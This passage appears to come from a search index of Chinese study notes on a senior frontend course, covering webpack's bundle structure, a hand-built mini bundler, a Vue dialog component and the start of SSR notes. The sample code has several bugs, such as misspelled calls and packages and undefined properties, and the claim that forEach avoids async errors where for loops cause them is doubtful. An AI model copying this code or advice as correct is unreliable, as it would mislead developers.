<p>\u8bfb\u5199\u6587\u4ef6\u662f\u5f02\u6b65\u64cd\u4f5c\uff1b\u5faa\u73af\u4e2d\u5982\u679c\u6709\u5f02\u6b65\u64cd\u4f5c\uff0cnode\uff0c\u6700\u597d\u662fforEach\uff0c\u907f\u514d\u5f02\u6b65</p> <p>for\u5faa\u73af\u4f1a\u9020\u6210\u5f02\u6b65\u9519\u8bef</p> <p>\u524d\u7aef\u4e3a\u4ec0\u4e48\u8d8b\u5411\u4e8e\u8f6f\u4ef6\u5de5\u7a0b\uff1f\u524d\u7aef\u73b0\u5728\u53d8\u6210\u72ec\u7acb\u7684\u79cd\u7c7b\u3002\u524d\u7aef\u9879\u76ee\u7684\u590d\u6742\u5316\uff0c\u5e26\u6765\u96be\u5ea6\u589e\u52a0\uff0c\u6240\u4ee5\u8f6f\u4ef6\u5de5\u7a0b\u5185\u5bb9\u5f00\u59cb\u5728\u524d\u7aef\u51fa\u73b0\u3002</p> <p>\u5de5\u7a0b\u5316\uff1a\u6807\u51c6</p> <ul> <li>\u547d\u4ee4\u884c\u5de5\u5177\uff1avue-cli react-create-app</li> <li>\u89c4\u8303 ESLint</li> <li>\u6d4b\u8bd5\uff1a\u5355\u5143\u6d4b\u8bd5\uff0ce2e</li> <li>\u6784\u5efa\uff1awebpack</li> <li>\u96c6\u6210\u548c\u90e8\u7f72\uff1aCI CD docker</li> <li>\u4ee3\u7801\u7ba1\u7406\uff1agit</li> </ul> <p>\u81ea\u5df1\u5c1d\u8bd5\u628aSDK\u6253\u5305\u538b\u7f29\u4e86\uff0c\u73b0\u5728\u53ea\u662fbabel\u5904\u7406\u4e86\uff0c\u6ca1\u6709\u538b\u7f29\uff08\u73b0\u5728\u53ea\u662f\u7f16\u8bd1\u6210ES5\uff0c\u6ca1\u6709\u6253\u5305\u548c\u538b\u7f29\uff0c\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4f7f\u7528webpack\u538b\u7f29\uff0c\u56e0\u4e3a\u5185\u90e8\u4e09\u4e2a\u6a21\u5757\u662f\u4e92\u76f8\u4f9d\u5b58\u7684\uff0c\u5bf9\u5916\u8f93\u51fa\u4e00\u4e2a\u6a21\u5757\uff09\uff1b\u81ea\u5df1\u7684JS\u57fa\u7840\u8981\u5f88\u624e\u5b9e\uff0c\u5426\u5219\u540e\u671f\u5de5\u7a0b\u5316\u4f1a\u9047\u5230\u5f88\u591a\u95ee\u9898\uff1b</p>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","title":"17 webpack\u6784\u5efa\u5206\u6790","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 8154  \u9605\u8bfb17\u5206\u949f</p> <p>\u3010\u8bfe\u7a0b\u4e3b\u9898\u3011\u4ece\u6e90\u7801\u63a2\u7a76\u6784\u5efa\u5de5\u5177\u4e4b\u624b\u52a8\u5b9e\u73b0webpack</p> <p>1\u3001webpack\u57fa\u672c\u4f7f\u7528\uff1a\u4ece\u6a21\u5757\u8c08\u8d77\uff0c\u5230\u5e95\u4ec0\u4e48\u662fwebpack</p> <p>2\u3001\u6253\u5305\u6587\u4ef6\u5206\u6790\uff1a\u5206\u6790bundile.min.js\u6e90\u7801</p> <p>3\u3001\u8bfb\u5b8c\u6e90\u7801\u6211\u4eec\u6765\u5199\u7b80\u6613webpack</p>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#webpack","title":"webpack \u5728\u54ea\u91cc\u4f7f\u7528","text":"<p>create-react-app\u3001vue-cli \u7b49\u811a\u624b\u67b6\u5df2\u7ecf\u6253\u5305\u4e86webpack\u5de5\u5177\uff0c\u6240\u4ee5\u9ad8\u7ea7\u6846\u67b6\u4e0d\u4f1a\u76f4\u63a5\u914d\u7f6e webpack\u3002\u9700\u8981\u5b89\u88c5 webpack webpack-cli\u3002</p> <p>\u4e3a\u4ec0\u4e48\u4f7f\u7528webpack? \u56e0\u4e3a\u6d4f\u89c8\u5668\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6JS\u7684\u5f15\u7528\u5173\u7cfb\uff0c\u4e0d\u80fd\u8bc6\u522brequire\uff0c\u6240\u4ee5\u9700\u8981\u6253\u5305\u6210\u4e00\u4e2a\u6587\u4ef6\uff0c\u8fd9\u6837\u6d4f\u89c8\u5668\u8bfb\u53d6\u6253\u5305\u540e\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002\u6253\u5305\u540e\u662f\u4e00\u4e2a IIFE \u7acb\u5373\u6267\u884c\u51fd\u6570\uff0c\u4e0d\u540c\u51fd\u6570\uff08\u6a21\u5757\uff09\u4f5c\u4e3a\u7acb\u5373\u6267\u884c\u7684\u53c2\u6570\u4f20\u5165\u3002</p> <p><code>touch webpack.config.js</code> \u65b0\u5efa\u914d\u7f6e\u6587\u4ef6</p> <ul> <li>entry \u5165\u53e3\u6a21\u5757</li> <li>module \u4e00\u4e2a\u6a21\u5757\u5373\u4e3a\u4e00\u4e2a\u6587\u4ef6\uff0c\u4eceentry\u6a21\u5757\u9012\u5f52\u627e\u51fa\u6240\u6709\u7684\u4f9d\u8d56\u6a21\u5757</li> <li>Chunk \u4ee3\u7801\u5757\uff0c\u4e00\u4e2a\u4ee3\u7801\u5757\u7531\u591a\u4e2a\u6a21\u5757\u7ec4\u5408\u800c\u6210\uff0c\u7528\u4e8e\u4ee3\u7801\u7684\u5408\u5e76\u548c\u5206\u5272</li> <li>loader \u6a21\u5757\u8f6c\u6362\u5668</li> <li>plugin \u63d2\u4ef6</li> <li>output \u8f93\u51fa\u7ed3\u679c</li> </ul> <pre><code>const path = require('path');\nmodule.exports = {\n  mode: 'none',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.min.js'\n  }\n};\n</code></pre>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#_1","title":"\u6267\u884c\u6d41\u7a0b","text":"<pre><code>\u5f00\u59cb\n\u52a0\u8f7d\u5165\u53e3\u51fd\u6570\uff08index.js\uff09\n\u6267\u884c webpackBootstrap\n__webpack_require__ require \u51fd\u6570\u8f6c\u6362\n\u6267\u884c\u6a21\u5757\n\uff08\u5982\u679c\u6709\u5176\u4ed6\u4f9d\u8d56\u6a21\u5757\uff0c\u9012\u5f52\u6267\u884c\u7b2c34\u6b65\uff09\n\u7ed3\u675f\n</code></pre>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#webpack_1","title":"webpack \u7684\u4f5c\u7528","text":"<p>\u4f9d\u8d56\u6587\u4ef6\uff08\u6a21\u5757\uff09\u641c\u96c6\uff1b\u5206\u6790\u4f9d\u8d56\u5173\u7cfb</p> <p>\u5185\u90e8\u5b9e\u73b0 require \u51fd\u6570\u91cd\u5199\uff08\u6d4f\u89c8\u5668\u4e0d\u652f\u6301require\uff09</p> <p>\u5165\u53e3\u6587\u4ef6ID\u662f0\uff0c\u6309\u7167\u987a\u5e8f\u5b58\u5165\u51fd\u6570\u7684\u53c2\u6570\uff0c\u7136\u540ewebpack\u4f9d\u6b21require\uff0c\u6839\u636e\u4e0d\u540c\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u6267\u884c\u4e0d\u540c\u7684\u51fd\u6570</p>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#_2","title":"\u5b98\u65b9\u89e3\u91ca","text":"<p>webpack \u662f\u6a21\u5757\u6253\u5305\u673a\uff1a\u5206\u6790\u9879\u76ee\u7ed3\u6784\uff0c\u627e\u5230 JS \u6a21\u5757\u548c\u5176\u4ed6\u6d4f\u89c8\u5668\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c\u7684\u6269\u5c55\u8bed\u8a00\uff08Sass TS\uff09\u5e76\u5c06\u5176\u6253\u5305\u6210\u5408\u9002\u7684\u5408\u9002\u4ee5\u4f9b\u6d4f\u89c8\u5668\u4f7f\u7528\u3002</p> <p>\u6784\u5efa\uff1a\u628a\u6e90\u4ee3\u7801\u8f6c\u6362\u6210\u7ebf\u4e0a\u53ef\u5b9e\u884c\u7684CSS JS HTML\u4ee3\u7801</p>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#_3","title":"\u5177\u4f53\u4f5c\u7528","text":"<pre><code>\u4ee3\u7801\u8f6c\u6362\uff1aTS SaSS \u7f16\u8bd1\u6210 JS CSS\n\u6587\u4ef6\u4f18\u5316\uff1a\u538b\u7f29JS\u6587\u4ef6\uff0c\u538b\u7f29\u5408\u5e76\u56fe\u7247\n\u4ee3\u7801\u5206\u5272\uff1a\u63d0\u53d6\u591a\u4e2a\u9875\u9762\u7684\u516c\u5171\u4ee3\u7801\uff0c\u63d0\u53d6\u9996\u5c4f\u52a0\u8f7d\u4e0d\u9700\u8981\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u5176\u5f02\u6b65\u52a0\u8f7d\u5b9e\u73b0\u9996\u5c4f\u4f18\u5316\n\u6a21\u5757\u5408\u5e76\uff1a\u5c06\u591a\u4e2a\u6a21\u5757\u5408\u5e76\u6210\u4e00\u4e2a\u6587\u4ef6\n\u81ea\u52a8\u5237\u65b0\uff1a\u76d1\u542c\u672c\u5730\u6e90\u4ee3\u7801\u7684\u53d8\u5316\uff0c\u81ea\u52a8\u91cd\u65b0\u6784\u5efa\uff0c\u5237\u65b0\u6d4f\u89c8\u5668\n\u4ee3\u7801\u6821\u9a8c\uff1a\u68c0\u9a8c\u4ee3\u7801\u89c4\u8303\uff0c\u5355\u5143\u6d4b\u8bd5\n\u81ea\u52a8\u53d1\u5e03\uff1a\u81ea\u52a8\u6784\u5efa\u7ebf\u4e0a\u53d1\u5e03\u4ee3\u7801\uff0c\u5e76\u4f20\u8f93\u5230\u53d1\u5e03\u7cfb\u7edf\n</code></pre>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#bundlemainjs","title":"bundle.main.js \u7ed3\u6784\u5206\u6790","text":"<p>\u9996\u5148\u628a\u51fd\u6570\u5185\u90e8\u6298\u53e0\uff0c\u5206\u6790\u6574\u7406\u7684\u7ed3\u6784\u548c\u5173\u7cfb</p> <pre><code>(function(modules) {\n  // IEFF \u81ea\u6267\u884c\u51fd\u6570\n})\n([]);\n</code></pre> <p>\u4e0b\u9762\u770b\u4f20\u53c2\uff0c\u4f20\u53c2\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u7684\u6bcf\u4e00\u9879\u662f\u4e00\u4e2a\u6a21\u5757\uff0c\u5bf9\u5e94\u4e00\u4e2aID</p> <pre><code>(function(modules) {\n  //\n})\n([\n  (function(module, exports, __webpack_require__) {\n    const fn = __webpack_require__(1);\n    fn();\n  }),\n  (function(module, exports, __webpack_require__) {\n    const name = __webpack_require__(2);\n    const fn = () =&gt; {\n      console.log(name);\n    }\n    module.exports = fn;\n  }),\n  (function(module, exports) {\n    const name = 'Michael An';\n    module.exports = name;\n  })\n]);\n</code></pre> <p>\u51fd\u6570\u4f53\uff0c\u5b9e\u73b0 require \u8f6c\u6362</p> <pre><code>// \u5185\u90e8\u81ea\u6267\u884c\u51fd\u6570\u548c\u6539\u5199\u7684require\u65b9\u6cd5\n(function(modules) {\n  // cache(\u7f13\u5b58\uff0c\u5982\u679c\u5df2\u7ecf\u5904\u7406\u8fc7\u7684\u6a21\u5757\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58\u4e2d\u8bfb\u53d6)\n  var installedModules = {};\n\n  // \u6539\u5199\u7684 require \u51fd\u6570\n  function __webpack_require__(moduleId) {\n    // check if module is in cache\n    if (installedModules[moduleId]) {\n      return installedModules[moduleId].exports;\n    }\n    // \u5982\u679c\u4e0d\u5728\u7f13\u5b58\u4e2d\uff0c\u521b\u5efa\u65b0\u7684\u6a21\u5757\u5e76\u653e\u5230\u7f13\u5b58\u4e2d\uff08\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217\u4e5f\u4f7f\u7528\u7f13\u5b58\uff09\n    // (\u6269\u5c55\uff1a\u7b97\u6cd5\u4e2d\u51e1\u662f\u80fd\u91cd\u590d\u8ba1\u7b97\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u5b58\u50a8\u7f13\u5b58)\n    var module = installedModules[moduleId] = {\n      i: moduleId,\n      l: false,\n      exports: {}\n    };\n    // \u6267\u884c\u6a21\u5757\u7684\u65b9\u6cd5\n    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n    // \u5c06\u6a21\u5757\u6807\u8bb0\u4e3a\u5df2\u52a0\u8f7d\uff08flag\uff1a\u52a8\u8bcd\uff0c\u6807\u8bb0\uff09\n    module.l = true;\n    return module.exports;\n  }\n  __webpack_require__.m = modules;\n  // ...\n  // \u52a0\u8f7d\u6a21\u5757\u7684\u5165\u53e3\n  return __webpack_require__(__webpack_require__.s = 0);\n})([module1, module2, module3]);\n</code></pre>"},{"location":"ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/#webpack_2","title":"\u81ea\u5b9a\u4e49\u7b80\u6613webpack","text":"<p>\u5206\u6790\u4f9d\u8d56\u5173\u7cfb\u524d\uff0c\u9996\u5148\u628a\u4e0d\u540c\u7684JS\u4ee3\u7801\u8bfb\u5165\uff0c\u7136\u540e\u83b7\u53d6require\u90e8\u5206\uff0c\u9700\u8981\u4f7f\u7528AST</p> <p>AST\uff08\u62bd\u8c61\u8bed\u6cd5\u6811\uff09\u7f16\u8bd1\u539f\u7406  babel \u4e5f\u4f1a\u7528\u5230AST\uff08astexplorer.net \u53ef\u4ee5\u5728\u7ebf\u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u6210AST\uff09\u9ad8\u7ea7\u8bed\u8a00\u6267\u884c\uff0c\u9700\u8981\u7f16\u8bd1\u5668\uff0c\u7f16\u8bd1\u6210\u4e3a\u4e8c\u8fdb\u5236\u4ee3\u7801\u3002\u5982\u679c\u5199\u8bed\u8a00\uff0c\u9700\u8981\u4f1a\u7f16\u8bd1\u539f\u7406\u3002</p> <p>\u8bcd\u6cd5\u5206\u6790\uff08\u626b\u63cf\uff09\u4ee3\u7801\u53bb\u6389\u6ce8\u91ca\uff0c\u4e00\u4e2a\u4e00\u4e2a\u5b57\u6bcd\u8bfb\u4ee3\u7801\uff0c\u79fb\u9664\u7a7a\u767d\uff0c\u5206\u5272\u6210tokens\u3002\u8bed\u6cd5\u5206\u6790 \u89e3\u6790\u5668 \u628atokens \u4e00\u4f4d\u6570\u7ec4\uff0c\u8f6c\u6362\u6210\u6811\uff0c\u76d1\u6d4b\u8bed\u6cd5\u9519\u8bef\uff0c\u5220\u9664\u4e0d\u5b8c\u6574\u7684\u62ec\u53f7\u3002</p> <p>\u5982\u679c\u76f4\u63a5\u8bfb\u6587\u4ef6\uff08\u7ed3\u679c\u662f\u5b57\u7b26\u4e32\uff09\uff0c\u7136\u540e\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5904\u7406\u4f9d\u8d56\u5173\u7cfb\uff0c\u6a21\u5757\u5f88\u5927\u5c31\u590d\u6742\u4e86\u3002\u6240\u4ee5\u4f7f\u7528AST\u6784\u5efa\u6587\u4ef6\u7ed3\u6784\u3002</p> <p>\u8bfb\u53d6\u6587\u4ef6\u540e\uff0c\u8f6c\u6362\u6210AST\uff0c\u7136\u540e\u4e00\u6b65\u4e00\u6b65\u5904\u7406\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>\u65b0\u5efa\u9879\u76ee\u548c\u811a\u672c package.json</p> <pre><code>npm init\nnpm install -D @babel/core @babel/genarator @babel/parser @babel/traverse\n</code></pre> <pre><code>{\n  \"name\": 'test',\n  \"version\": '1.0.0',\n  \"main\": 'index.js',\n  \"scripts\": {\n    \"wypack\": 'node wypack/wypack.js'\n  },\n  'devDependencies': {\n    'webpack': '^4.41.6',\n    'webpack-cli': '^3.3.11'\n  }\n}\n</code></pre> <p>\u4e0b\u9762\u662f\u811a\u672c wypack.js</p> <pre><code>const fs = require('fs');\nconst path = require('path');\nconst parser = require('@babel/parser');\nconst babel = require('@babel/core');\nconst traverse = require('@babel/traverse').default;\nconst generator = require('@babel/generator');\nconst ejs = require('ejs');\nconst config = require('../wypack.json');\nconst entry = config.entry;\nlet id = 0;\n\n// AST\nconst createAST = filePath =&gt; {\n  // \u9ed8\u8ba4\u8bfb\u53d6\u6587\u4ef6\u7684\u7ed3\u679c\u662f array Buffer\uff0c\u8fd9\u91cc\u9700\u8981\u8bbe\u7f6e\u683c\u5f0futf-8\n  const content = fs.readFileSync(filePath, 'utf-8');\n\n  // parse \u7528\u6765\u8f6c\u6362\u6210AST\n  const ast = parser.parse(content, {\n    sourceType: 'module'\n  });\n\n  // \u5355\u6587\u4ef6\u7684\u4f9d\u8d56\u653e\u5728\u4e00\u4e2a\u6570\u7ec4\n  let dependencies = [];\n  // \u4f9d\u8d56\u641c\u96c6\uff1a@babel/travers\u7528\u6765\u904d\u5386\u66f4\u65b0@babel/parser\u751f\u6210\u7684AST\n  traverse(ast, {\n    CallExpression(p) {\n      const node = p.node;\n      if (node.callee.name === \"require\") {\n        node.callee.name = '__webpack_require__';\n        let resultPath = node.arguments[0].value;\n        // \u5224\u65ad\u662f\u5426\u6709\u540e\u7f00\u540d\uff0c\u5982\u679c\u6ca1\u6709\u52a0\u4e0aJS\u540e\u7f00\u540d\n        resultPath = resultPath + (path.extname(resultPath) ? '' : 'js');\n        dependencies.push(resultPath);\n      }\n    }\n  });\n  // \u91cd\u65b0\u751f\u6210\u4ee3\u7801\n  let code = generator(ast).code;\n  let moduleId = id++;\n  return {\n    moduleId,\n    filePath,\n    code,\n    dependencies\n  };\n};\n\n// \u5904\u7406\u591a\u4e2a\u6587\u4ef6\u7684\u4f9d\u8d56\nconst createGraph = entry =&gt; {\n  const ast = createAST(entry);\n  const queue = [ast];\n  // \u5904\u7406\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\n  for (const item of queue) {\n    const dirname = path.dirname(ast.filePath);\n    item.dependencies.map(relativePath =&gt; {\n      const absolutePath = path.join(dirname, relativePath);\n      const child = createAST(absolutePath);\n      queue.push(child);\n    });\n  }\n  console.log(queue);\n  return queue;\n}\n\nconst modules = createGraph(entry);\nconst entryId = modules[0].moduleId;\n\nlet code = [];\nmodules.map((item, index) =&gt; {\n  const packCode = {\n    id: modules[index].mapping,\n    code: modules[index].code,\n  };\n  code.push(packCode);\n});\n\nlet reg = new RegExp(/__webpack_require__\\((.+?)\\)/g);\n\ncode = code.map((item, index) =&gt; {\n  if (item.code.match(reg)) {\n    item = item.code.replace(\n      reg,\n            `__webpack_require__(${Object.values(item.id)})`\n    );\n  } else {\n    item = item.code;\n  }\n  return item;\n});\nconsole.log(code);\n\nlet { path, filename } = config.output; \nlet output = `${path}\\\\${filename}`;\nlet template = fs.readFileSync('./wypack/template.ejs', 'utf-8');\n\nlet package = ejs.render(template, {\n  entryId,\n  code\n});\n\ncreateAST(entry);\nfs.writFileSync(output, package);\n</code></pre>"},{"location":"ebook-netease-senior-frontend/20-%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD-VUE%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/","title":"\u7b2c20\u8bfe \u5b9e\u6218Vue\u7ec4\u4ef6\u5316\u5f00\u53d1","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 2198  \u9605\u8bfb5\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/20-%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD-VUE%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/#_1","title":"\u76ee\u6807","text":"<p>\u5b9e\u73b0\u7c7b\u4f3c element.js \u4e2d modal \u7ec4\u4ef6\u7684\u6548\u679c\uff0c\u57fa\u4e8e VUE</p>"},{"location":"ebook-netease-senior-frontend/20-%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD-VUE%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/#_2","title":"\u5f00\u53d1\u73af\u5883\u642d\u5efa","text":"<pre><code>npm install @vue/cli -g\nvue init vue-modal\n</code></pre> <p>\u5177\u4f53\u7684\u5f00\u53d1\u73af\u5883\u642d\u5efa\u53c2\u8003VUE\u9879\u76ee\u521d\u59cb\u5316\u8fc7\u7a0b</p> <p>https://github.com/Michael18811380328/HelloVUE/blob/master/vue-cli/vuecli%20%E4%BD%BF%E7%94%A8.md</p> <p>\u521d\u59cb\u5316\u5b8c\u6bd5\u540e\uff0c\u5220\u9664\u9879\u76ee\u4e2d\u7684\u9ed8\u8ba4\u7684VUE\u754c\u9762</p> <p>App.vue \u8fd9\u662f\u539f\u59cb\u6587\u4ef6</p> <pre><code>&lt;template&gt;\n    &lt;div id=\"app\"&gt;&lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {\n  name: 'App',\n  components: {\n\n  }\n}\n&lt;/script&gt;\n</code></pre> <p>\u4fee\u6539\u6210\u4e0b\u9762\u7684\u81ea\u5b9a\u4e49\u6587\u4ef6</p> <pre><code>&lt;template&gt;\n    &lt;div id=\"app\"&gt;\n    &lt;wy-test&gt;&lt;/wy-test&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nimport WyTest from './Wytest';\nexport default {\n  name: 'App',\n  components: {\n    WyTest\n  }\n}\n&lt;/script&gt;\n</code></pre> <p>Wytest.vue</p> <pre><code>&lt;template&gt;\n    &lt;div&gt;\n    &lt;wy-dialog&gt;&lt;/wy-dialog&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n  import WyDialog from '../packages/WyDialog'\n  export default {\n    name: 'WyTest',\n    components: {\n      WyDialog\n    }\n  }\n&lt;/script&gt;\n</code></pre> <p>WyDialog.vue</p> <pre><code>&lt;template&gt;\n    &lt;div class=\"wy_dialog_wrapper\"&gt;\n    &lt;div class=\"wy_dialog\"&gt;\n      &lt;!-- head --&gt;\n      &lt;div class=\"wy_dialog_header\"&gt;\n        &lt;span class=\"wy_dialog_title\"&gt;\u63d0\u793a\u6587\u5b57&lt;/span&gt;\n        &lt;button class=\"wy_dialog_header_btn\"&gt;\n          &lt;i class=\"wy-icon-close\"&gt;&lt;/i&gt;\n            &lt;/button&gt;\n        &lt;/div&gt;\n      &lt;!-- body --&gt;\n      &lt;div class=\"wy-dialog-body\"&gt;\n        &lt;span&gt;\u8fd9\u662f\u5185\u5bb9&lt;/span&gt;\n        &lt;/div&gt;\n      &lt;!-- footer --&gt;\n      &lt;div class=\"wy-dialog-footer\"&gt;\n        &lt;button&gt;\u53d6\u6d88&lt;/button&gt;\n        &lt;button&gt;\u786e\u8ba4&lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n</code></pre> <p>\u9700\u8981\u521d\u59cb\u5316</p> <p>HTML CSS \u5df2\u7ecf\u6709\u4e86\u4e0d\u9700\u8981\u8003\u8651</p> <p>\u7ec4\u4ef6\u62c6\u5206</p> <p>\u7ec4\u4ef6\u590d\u7528\u6027-\u624b\u52a8\u66f4\u6539</p> <p>\u8c03\u7528\u8005\u4f20\u9012\u53c2\u6570</p> <p>\u6d4b\u8bd5</p> <p>slot \u63d2\u69fd</p> <p>\u7ed9\u7ec4\u4ef6\u4f20\u9012name \u9ed8\u8ba4\u7684\u53c2\u6570 \u6570\u636e\u7c7b\u578b\u662f\u5b57\u7b26\u4e32</p> <p>main.js</p> <pre><code>import Vue from 'vue';\nimport App from './App.vue';\n\nVue.config.prodectionTip = false;\n\nnew Vue({\n  render: h =&gt; h(app)\n}).$mount('#app')\n</code></pre>"},{"location":"ebook-netease-senior-frontend/20-%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD-VUE%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/#wy-dialog","title":"Wy-Dialog \u7ec4\u4ef6\u7684\u5b9e\u73b0","text":"<p>\u770b\u4e8625\u5206\u949f\uff0c\u540e\u9762\u7684\u57fa\u672c\u662fVUE\u7684\u5185\u5bb9\uff0c\u770b\u4e0d\u61c2</p>"},{"location":"ebook-netease-senior-frontend/21-ssr/","title":"21-SSR \u505a\u4e48\u505a","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 10474  \u9605\u8bfb21\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/21-ssr/#ssr","title":"SSR \u662f\u4ec0\u4e48","text":"<p>SSR\uff1a\u9996\u5c4f\u670d\u52a1\u7aef\u6e32\u67d3-server side render</p> <p>SEO\u539f\u7406\uff1a\u4f7f\u7528\u722c\u866b\u722c\u53d6HTML\u4e2d\u7684\u5173\u952e\u5b57\u548c\u4e3b\u8981\u6807\u9898</p> <p>\u9762\u8bd5\uff1a\u4f60\u7684\u67d0\u4e2a\u9879\u76ee\u4e2d\u6709\u4ec0\u4e48\u4eae\u70b9\uff1f\u4e3a\u4e86SEO\u4f18\u5316\u548c\u52a0\u5feb\u9996\u5c4f\u4f18\u5316\u901f\u5ea6\uff0c\u8fdb\u884c\u4e86SSR\u6e32\u67d3\uff1b</p> <p>SSR\uff1a\u670d\u52a1\u5668\u7aef\u89e3\u6790\u6267\u884cJS\uff08\u5f00\u542f\u4e00\u4e2aNode\u670d\u52a1\uff0c\u6267\u884c\u8bf7\u6c42\uff0c\u751f\u4ea7HTML\uff0c\u628a\u5904\u7406\u597d\u7684\u9875\u9762\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\uff09\uff1b\u51cf\u5c11\u6d4f\u89c8\u5668\u7684\u5361\u987f\uff08\u670d\u52a1\u5668\u538b\u529b\u589e\u52a0\u4e86\uff09\uff1b\u5ba2\u6237\u770b\u5230\u7684\u6548\u679c\u5f88\u8212\u670d\uff1b</p> <p>\u597d\u5904\uff1a\u51cf\u8f7b\u6d4f\u89c8\u5668\u5de5\u4f5c\u538b\u529b\uff08\u53ea\u5b9e\u73b0UI\u5c42\uff0c\u5185\u5b58\u5c11\uff09\uff1b\u5b9e\u73b0\u9996\u5c4f\u4f18\u5316\uff08\u9996\u9875\u5168\u90e8\u7684\u6e32\u67d3\u5728\u6d4f\u89c8\u5668\uff09\uff08\u539f\u6765\u8bf7\u6c42\u5f88\u591a\u6587\u4ef63MB\uff0c\u73b0\u5728\u53ea\u8bf7\u6c42300KB\uff09\uff1b\u5229\u4e8eSEO\uff08SEO\u722c\u866b\u4e3b\u8981\u83b7\u53d6HTML\uff0c\u4f20\u7edf\u7684\u754c\u9762\u662fJS\u751f\u6210\u7684\uff0c\u6240\u4ee5\u5f88\u591a\u4fe1\u606f\u65e0\u6cd5\u83b7\u53d6\uff09</p> <p>\u574f\u5904\uff1a\u4f20\u7edf\u754c\u9762\u7c7b\u4f3c\u4e8e\u539f\u751f\u7684\u754c\u9762\u8df3\u8f6c\uff0cSSR\u540e\u6bcf\u6b21\u8fdb\u5165\u4e00\u4e2a\u65b0\u9875\u9762\u9700\u8981\u91cd\u65b0\u8bf7\u6c42\u5237\u65b0\u3002</p> <p>VUE\u6839\u636e\u751f\u547d\u5468\u671f\u51fd\u6570\u62c6\u5206\u670d\u52a1\u5668\u7aef\u7684JS\u548c\u6d4f\u89c8\u5668\u7684JS\u90e8\u5206\uff08\u4e0d\u9700\u8981\u81ea\u5df1\u5199\uff09</p> <p>\u4f20\u7edf\u67b6\u6784\uff1a\u5b8c\u5168\u6d4f\u89c8\u5668\u6e32\u67d3\uff08\u670d\u52a1\u5668\u7aef\u5b58\u653e\u9759\u6001\u8d44\u6e90\uff0cindex.html, app.bundle.js\uff0capp.bundle.css \u6d4f\u89c8\u5668\u8bf7\u6c42\u540e\u6e32\u67d3\u754c\u9762\uff09\u7c7b\u4f3c\u4e8e\u539f\u751fAPP\u7684\u4f7f\u7528\u4f53\u9a8c\u3002</p> <p>\u628aCLI\u6539\u9020\u6210SSR</p>"},{"location":"ebook-netease-senior-frontend/21-ssr/#ssr_1","title":"SSR\u7ec4\u6210\u90e8\u5206","text":"<p>app.js \u5206\u6210\u4e24\u90e8\u5206\uff1acode(store + router + component) =&gt; server entey + client entry  =&gt; webpack build =&gt; server bundle.js + client.bundle.js =&gt; server render + client render</p> <p>\u6bcf\u4e00\u6b21\u8bbf\u95ee\u9700\u8981\u65b0\u5efa\u4e00\u4e2aVUE\u5b9e\u4f8b\uff08\u5bf9\u4e8e\u754c\u9762\u9891\u7e41\u8df3\u8f6c\u7684\u60c5\u51b5\u4e0d\u9002\u5408\uff09</p> <p>\u670d\u52a1\u5668\u7aef\u4f1a\u6267\u884c beforeCreate 